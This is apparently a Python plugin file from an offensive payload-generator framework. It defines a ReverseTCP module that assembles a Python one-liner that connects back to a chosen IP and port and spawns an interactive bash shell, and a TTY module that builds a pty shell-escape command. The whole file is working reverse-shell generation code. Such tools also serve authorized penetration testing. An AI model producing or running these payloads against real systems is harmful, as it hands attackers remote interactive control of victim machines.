from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--exec",
            default="pty",
            choices=[
                'pty',
                'subprocess',
            ]
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = """{} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,""".format(self.args.type)
        self.shell += """socket.SOCK_STREAM);s.connect(("{}",{}));""".format(self.args.ip, self.args.port)
        self.shell += """os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(), 2);"""
        if self.args.exec == "pty":
            self.shell += """import pty;pty.spawn("{}")'""".format(self.args.shell)
        elif self.args.exec == "subprocess":
            self.shell += """p=subprocess.call(["{}","-i"]);'""".format(self.args.shell)


class TTY(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[TTYShell][TCP] Python TTY shell escape from https://netsec.ws/?p=337"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = """{} -c 'import pty; pty.spawn("{}")'""".format(self.args.type, self.args.shell)
